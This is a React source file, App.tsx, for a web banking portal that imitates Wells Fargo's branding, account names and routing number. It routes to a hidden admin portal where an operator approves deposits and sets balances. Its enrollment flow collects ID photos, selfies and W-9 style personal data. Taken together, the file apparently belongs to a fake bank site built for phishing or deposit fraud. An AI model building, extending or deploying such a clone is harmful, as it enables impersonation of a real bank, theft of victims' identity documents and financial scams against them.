import React, { useState } from 'react';
import { INITIAL_USER_DATA } from './data/mockData';
import { UserProfile, BankAccount } from './types/banking';
import { WebBankingDashboard } from './components/portal/WebBankingDashboard';
import { WebPortalView } from './components/portal/WebPortalView';
import { SignOnModal } from './components/auth/SignOnModal';
import { AskFargoModal } from './components/mobile/AskFargoModal';
import { SignatureCardModal } from './components/portal/SignatureCardModal';
import { AccountOpenFlow } from './components/mobile/AccountOpenFlow';
import { AndroidWorkflowsModal } from './components/workflow/AndroidWorkflowsModal';
import { AdminPortalModal } from './components/admin/AdminPortalModal';
import { Sparkles, HelpCircle } from 'lucide-react';
import { authService } from './services/authService';
import { apiFetch } from './utils/api';

export default function App() {
  const [userData, setUserData] = useState<UserProfile>(INITIAL_USER_DATA);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [webSection, setWebSection] = useState<'banking' | 'public'>('public');
  const [isSignOnOpen, setIsSignOnOpen] = useState(false);
  const [isFargoOpen, setIsFargoOpen] = useState(false);
  const [isSignatureCardOpen, setIsSignatureCardOpen] = useState(false);
  const [isAccountOpenFlowActive, setIsAccountOpenFlowActive] = useState(false);
  const [isWorkflowsOpen, setIsWorkflowsOpen] = useState(false);
  const [isAdminPortalOpen, setIsAdminPortalOpen] = useState(false);
  const [justSignedOff, setJustSignedOff] = useState(false);

  React.useEffect(() => {
    const handleNavigation = () => {
      try {
        const pathname = window.location.pathname.toLowerCase();
        const hash = window.location.hash.toLowerCase();

        if (pathname.includes('/admin') || hash.includes('admin')) {
          setIsAdminPortalOpen(true);
        } else if (pathname.includes('/login') || pathname.includes('/signon')) {
          setIsSignOnOpen(true);
        } else if (pathname.includes('/portal') || pathname.includes('/dashboard') || pathname.includes('/banking')) {
          setIsSignOnOpen(true);
        } else if (pathname.includes('/enroll') || pathname.includes('/signature-card') || pathname.includes('/apply')) {
          setIsSignatureCardOpen(true);
        } else if (pathname.includes('/fargo')) {
          setIsFargoOpen(true);
        } else if (pathname.includes('/workflows') || pathname.includes('/apk') || pathname.includes('/android')) {
          setIsWorkflowsOpen(true);
        }

        if (hash.includes('workflow') || hash.includes('apk') || hash.includes('android')) {
          setIsWorkflowsOpen(true);
        }

        if (hash.includes('#path=')) {
          const decoded = decodeURIComponent(hash.replace('#path=', ''));
          if (decoded.includes('/admin')) setIsAdminPortalOpen(true);
          if (decoded.includes('/login')) setIsSignOnOpen(true);
          if (decoded.includes('/enroll')) setIsSignatureCardOpen(true);
          if (decoded.includes('/workflows') || decoded.includes('/apk')) setIsWorkflowsOpen(true);
          if (decoded.includes('/portal') || decoded.includes('/dashboard')) {
            setIsSignOnOpen(true);
          }
        }
      } catch (e) {
        // Safe fallback
      }
    };

    handleNavigation();
    window.addEventListener('hashchange', handleNavigation);
    window.addEventListener('popstate', handleNavigation);
    return () => {
      window.removeEventListener('hashchange', handleNavigation);
      window.removeEventListener('popstate', handleNavigation);
    };
  }, []);

  // Function to fetch the absolute latest user profile and balances from MongoDB Atlas
  const fetchUserFromMongo = React.useCallback(async (identifier: string) => {
    if (!identifier || identifier.trim() === '') return null;
    try {
      const res = await apiFetch(`/api/user/${encodeURIComponent(identifier)}?_ts=${Date.now()}`);
      if (res.ok) {
        const data = await res.json();
        if (data.success && data.user?.profile) {
          setUserData(data.user.profile);
          authService.syncUserFromServer(data.user);
          return data.user.profile;
        }
      }
    } catch (e) {
      console.warn('Error fetching fresh user from MongoDB:', e);
    }
    return null;
  }, []);

  // Restore session on page refresh and immediately load latest balance from MongoDB Atlas
  React.useEffect(() => {
    try {
      const savedSession = localStorage.getItem('wf_active_session');
      if (savedSession) {
        setIsLoggedIn(true);
        setWebSection('banking');
        fetchUserFromMongo(savedSession);
      }
    } catch {
      // safe fallback
    }
  }, [fetchUserFromMongo]);

  // Live Heartbeat: poll MongoDB every 3 seconds while logged in so any update in MongoDB reflects fast
  React.useEffect(() => {
    if (!isLoggedIn) return;
    const currentSession = localStorage.getItem('wf_active_session') || userData.name;
    if (!currentSession) return;

    const interval = setInterval(() => {
      fetchUserFromMongo(currentSession);
    }, 3000);

    const onFocus = () => {
      fetchUserFromMongo(currentSession);
    };
    window.addEventListener('focus', onFocus);
    document.addEventListener('visibilitychange', onFocus);

    return () => {
      clearInterval(interval);
      window.removeEventListener('focus', onFocus);
      document.removeEventListener('visibilitychange', onFocus);
    };
  }, [isLoggedIn, userData.name, fetchUserFromMongo]);

  const handleLoginSuccess = async (enteredName: string, profileData?: any) => {
    setIsLoggedIn(true);
    setWebSection('banking');
    setJustSignedOff(false);

    try {
      localStorage.setItem('wf_active_session', enteredName);
    } catch {}

    // Prioritize fresh MongoDB Atlas data to display updated balances immediately
    const freshProfile = await fetchUserFromMongo(enteredName);
    if (!freshProfile) {
      if (profileData) {
        setUserData(profileData);
      } else {
        const localUser = authService.findUserByUsername(enteredName);
        if (localUser?.profile) {
          setUserData(localUser.profile);
        }
      }
    }
  };

  const handleSignOff = () => {
    setIsLoggedIn(false);
    setWebSection('public');
    setIsSignOnOpen(false);
    setIsFargoOpen(false);
    setIsSignatureCardOpen(false);
    setIsAccountOpenFlowActive(false);
    setJustSignedOff(true);
    try {
      localStorage.removeItem('wf_active_session');
    } catch {}
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleEnrollSuccess = (newCustomerName: string, accountType?: string, fullData?: any) => {
    setIsSignatureCardOpen(false);
    setIsLoggedIn(true);
    setWebSection('banking');

    // Create fresh zero-dollar balance accounts for the newly registered user
    const checkingNum = Math.floor(1000 + Math.random() * 9000).toString();
    const savingsNum = Math.floor(1000 + Math.random() * 9000).toString();

    const zeroAccounts: BankAccount[] = [
      {
        id: `checking-${checkingNum}`,
        name: 'EVERYDAY CHECKING',
        accountNumber: `..${checkingNum}`,
        routingNumber: '061000227',
        type: 'checking',
        availableBalance: 0.00,
        currentBalance: 0.00,
        transactions: [],
      },
      {
        id: `savings-${savingsNum}`,
        name: 'WAY2SAVE SAVINGS',
        accountNumber: `..${savingsNum}`,
        routingNumber: '061000227',
        type: 'savings',
        availableBalance: 0.00,
        currentBalance: 0.00,
        transactions: [],
      },
    ];

    const newProfile: UserProfile = {
      name: newCustomerName,
      avatarUrl: fullData?.selfieUrl || fullData?.idPhotoUrl,
      idPhotoUrl: fullData?.idPhotoUrl,
      idPhotoBackUrl: fullData?.idPhotoBackUrl,
      idType: fullData?.c1PrimaryIdDesc,
      greetingTime: 'morning',
      ficoScore: 780,
      ficoChange: 0,
      ficoUpdatedDate: new Date().toLocaleDateString('en-US'),
      unreadNotifications: 1,
      bonusCode: 'JA23OU',
      accounts: zeroAccounts,
      bills: [],
      recentDeposits: [],
      treasuryHoldings: [],
      voiceNotes: [],
      registrationData: fullData,
    };

    // Immediately record to live unified database (server + local storage)
    authService.recordOrUpdateUser(
      fullData?.username || newCustomerName,
      newProfile,
      fullData
    );

    setUserData(newProfile);
    setIsAccountOpenFlowActive(true);
  };

  const handleDepositApproved = (depositId: string, updatedUser?: any) => {
    if (updatedUser?.profile) {
      setUserData(updatedUser.profile);
    } else {
      // Refresh current user data from server
      apiFetch(`/api/user/${encodeURIComponent(userData.name)}`)
        .then((res) => res.json())
        .then((data) => {
          if (data.user?.profile) {
            setUserData(data.user.profile);
          }
        })
        .catch(() => {});
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col font-sans selection:bg-[#d71e28] selection:text-white">
      {/* Main Content: Web Banking Portal & Dashboard */}
      <div className="flex-1 w-full">
        {webSection === 'banking' && isLoggedIn ? (
          <WebBankingDashboard
            userData={userData}
            onUpdateUserData={setUserData}
            onSignOff={handleSignOff}
            onOpenPublicPortal={() => setWebSection('public')}
            onOpenSignatureCard={() => setIsSignatureCardOpen(true)}
            onOpenAccountOpenFlow={() => setIsAccountOpenFlowActive(true)}
            onOpenAskFargo={() => setIsFargoOpen(true)}
            onOpenWorkflows={() => setIsWorkflowsOpen(true)}
            onOpenAdminPortal={() => setIsAdminPortalOpen(true)}
          />
        ) : (
          <WebPortalView
            onOpenSignOn={() => {
              setJustSignedOff(false);
              setIsSignOnOpen(true);
            }}
            onOpenAccountForm={() => setIsSignatureCardOpen(true)}
            onOpenFargoInsights={() => setIsFargoOpen(true)}
            onOpenSignatureCard={() => setIsSignatureCardOpen(true)}
            onOpenDashboard={() => {
              if (isLoggedIn) {
                setWebSection('banking');
              } else {
                setIsSignOnOpen(true);
              }
            }}
            onOpenWorkflows={() => setIsWorkflowsOpen(true)}
            onOpenAdminPortal={() => setIsAdminPortalOpen(true)}
            isLoggedIn={isLoggedIn}
            userName={userData.name}
            userData={userData}
            onUpdateUserData={setUserData}
            justSignedOff={justSignedOff}
            onDismissSignedOff={() => setJustSignedOff(false)}
          />
        )}
      </div>

      {/* Sign On Modal with scenic background */}
      <SignOnModal
        isOpen={isSignOnOpen}
        onClose={() => setIsSignOnOpen(false)}
        onLoginSuccess={handleLoginSuccess}
        onOpenEnroll={() => setIsSignatureCardOpen(true)}
        onOpenAdminPortal={() => setIsAdminPortalOpen(true)}
      />

      {/* Ask Fargo AI Assistant Modal */}
      <AskFargoModal
        isOpen={isFargoOpen}
        onClose={() => setIsFargoOpen(false)}
        userData={userData}
        onNavigateToTab={() => {
          setWebSection('banking');
          setIsFargoOpen(false);
        }}
      />

      {/* Signature Card Modal (Consumer Account Application Form W-9) */}
      <SignatureCardModal
        isOpen={isSignatureCardOpen}
        onClose={() => setIsSignatureCardOpen(false)}
        customerName={`${userData.name}`}
        onEnrollSuccess={handleEnrollSuccess}
      />

      {/* Admin Operations & Deposit Approval Portal */}
      <AdminPortalModal
        isOpen={isAdminPortalOpen}
        onClose={() => {
          setIsAdminPortalOpen(false);
          if (window.location.hash.toLowerCase().includes('admin')) {
            window.history.replaceState(null, '', window.location.pathname + window.location.search);
          }
        }}
        onDepositApproved={handleDepositApproved}
      />

      {/* Android Workflows & APK Modal */}
      <AndroidWorkflowsModal
        isOpen={isWorkflowsOpen}
        onClose={() => setIsWorkflowsOpen(false)}
      />

      {/* Account Open Flow Modal (Your Account Is Open! JA23OU) */}
      {isAccountOpenFlowActive && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-center justify-center p-2 sm:p-4 overflow-y-auto">
          <div className="w-full max-w-lg bg-white rounded-2xl shadow-2xl overflow-hidden animate-in zoom-in-95">
            <AccountOpenFlow
              customerName={`${userData.name}`}
              onContinue={() => {
                setIsAccountOpenFlowActive(false);
                setWebSection('banking');
              }}
            />
          </div>
        </div>
      )}
    </div>
  );
}
